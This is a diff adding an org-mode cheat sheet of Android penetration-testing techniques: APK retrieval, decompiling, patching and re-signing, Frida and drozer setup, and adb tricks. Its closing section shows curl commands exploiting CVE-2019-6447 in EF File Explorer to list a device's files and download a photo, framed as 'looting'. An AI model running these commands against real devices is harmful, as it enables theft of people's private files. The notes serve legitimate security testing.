@@ -1,0 +1,146 @@
+#+TITLE: Android pentesting
+#+INCLUDE: ../../../templates/rtfsg.org
+
+
+* General resources
+
+- [[https://owasp.org/www-project-mobile-security/][OWASP Mobile Security Project]] and in particular the [[https://owasp.org/www-project-mobile-security-testing-guide/][Mobile Security Testing Guide (MSTG)]].
+
+* Setup
+*** Retrieve APKs
+
+Download APKs from these platforms to avoid going through the Google
+PlayStore. Make sure to double-check that you are testing the correct
+version of the app.
+
+- [[https://www.apkmirror.com][https://www.apkmirror.com]]
+- [[https://apkpure.com/][https://apkpure.com/]]
+- [[https://apk-dl.com][https://apk-dl.com]]
+- [[https://apkcombo.com][https://apkcombo.com]]
+
+* Static analysis
+*** Decompiling
+
+[[https://github.com/skylot/jadx][jadx]] is doing a great job at decompiling dex files, here are some options
+that I tend to use:
+
+#+BEGIN_SRC shell
+jadx -j 8 --deobf --deobf-use-sourcename --fs-case-sensitive <file>
+#+END_SRC
+
+*** Patching APK
+
+Simply use =apktool= to decode the APK to smali and extract the resources,
+then rebuild the modified APK. This can be useful to quickly edit some files
+like Manifest.xml file or hard-coded values in the code.
+
+#+begin_src shell
+apktool d MyApp.apk
+# Do your edits
+apktool b -f -d MyApp/
+#+end_src
+
+However the APK is not signed yet, it probably won't install on the device.
+
+#+begin_src shell
+adb install MyApp/dist/MyApp.apk
+# Show error
+#+end_src
+
+To sign it, you need a key. You probably don't have one yet so let's create
+one and sign the apk.
+
+#+begin_src shell
+keytool -genkey -v -keystore apksign.keystore -alias apksign -keyalg RSA -keysize 2048 -validity 10000
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apksign.keystore MyApp/dist/MyApp.apk apksign
+jarsigner -verify -verbose -certs MyApp/dist/MyApp.apk
+zipalign -v 4 MyApp/dist/MyApp.apk MyApp-signed.apk
+#+end_src
+
+*** Decompiling Xamarin / .NET applications
+*** Flutter applications
+
+If the application has been compiled with [[https://docs.flutter.dev/testing/build-modes][debug mode]], the source code is
+embedded into a *kernel_blob.bin* file bundled with the apk. To retrieve it, simply
+extract the APK with /jadx/ or /apktool/ and run =strings= on the
+*kernel_blob.bin* file.
+
+#+begin_src shell
+$ jadx test.apk
+$ strings test/resources/assets/flutter_assets/kernel_blob.bin > extracted.dart
+#+end_src
+
+*** Extract Android backup
+*** Looking for secrets
+
+Links to some github repo plz.
+
+- [[https://github.com/dwisiswant0/apkleaks][Searches for URLs, endpoints and secrets in APK files]]
+
+* Dynamic analysis
+*** Injecting frida into an APK with objection
+
+Injecting Frida into an APK allows it to be run on non-rooted devices.
+
+First of all make sure you have an up-to-date Frida + Objection
+installation. I tend to use a separate python virtual environment for
+convenience.
+
+#+begin_src shell
+python -m venv ~/.myvenvs/objection
+. ~/.myvenvs/objection/bin/activate
+pip install --upgrade pip && pip install objection
+objection --help
+frida -h
+#+end_src
+
+*** Drozer setup
+
+1) Download the drozer-agent from [[https://github.com/FSecureLABS/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk][here]] and install it on the device with ~adb
+   install drozer-agent-2.3.4.apk~.
+
+2) Forward the TCP ports used by drozer (default is 31415) with adb ~adb forward
+   tcp:31415 tcp:31415~.
+
+3) Then run drozer via its docker image (you may need to do some network mapping
+   for the docker container): ~sudo docker run --network host --rm -it
+   fsecurelabs/drozer~.
+
+4) Initial a connection with ~drozer console connect~. You're in!
+
+*** ADB logs
+
+Source: [[https://twitter.com/_bagipro/status/1572569994512461827][Sergey Toshin]]
+
+#+begin_src shell
+adb logcat --pid=`adb shell pidof -s http://com.app.package`
+adb logcat -s AndroidRuntime
+adb logcat -s libc,DEBUG
+#+end_src
+
+* ADB
+*** SSH forwarding to adb
+
+Use ssh forwarding if adb is only listening locally on the target device and
+you have ssh access to it.
+
+#+begin_src shell
+ssh -p 22 -L 5555:localhost:5555 user@target
+adb connect localhost:5555
+adb -s localhost shell
+#+end_src
+
+*** Set global Android proxy
+
+#+begin_src shell
+adb shell settings put global http_proxy 10.0.2.2:8080
+#+end_src
+
+* Misc
+*** EF File Explorer
+
+EF File Explorer File Manager usually runs on port 59777 and is vulnerable to
+[[https://nvd.nist.gov/vuln/detail/CVE-2019-6447][CVE-2019-6447]] for which there exist a simple [[https://www.exploit-db.com/exploits/50070][poc]]. You can also use =curl -d
+'{"command":"listFiles"} http://target:59777= and observe that the target's file
+system is often simply mapped to */*. Run =curl
+http://target:59777/sdcard/photo.jpg= and enjoy the looting!
